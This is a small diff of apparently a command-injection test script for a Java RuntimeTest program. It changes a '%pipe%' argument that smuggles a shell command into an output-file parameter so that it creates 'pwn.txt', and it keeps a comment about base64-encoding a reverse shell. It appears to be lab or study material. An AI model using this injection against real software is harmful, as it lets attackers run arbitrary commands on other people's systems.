@@ -1,4 +1,4 @@
-java RuntimeTest '%pipe%{touch,/u02/projects/JavaCommandInjection/dickbutt.txt} -sOutputFile=' test "/u02/projects/JavaCommandInjection/"
+java RuntimeTest '%pipe%{touch,/u02/projects/JavaCommandInjection/pwn.txt} -sOutputFile=' test "/u02/projects/JavaCommandInjection/"
 
 :: base64 encode reverse shell
 
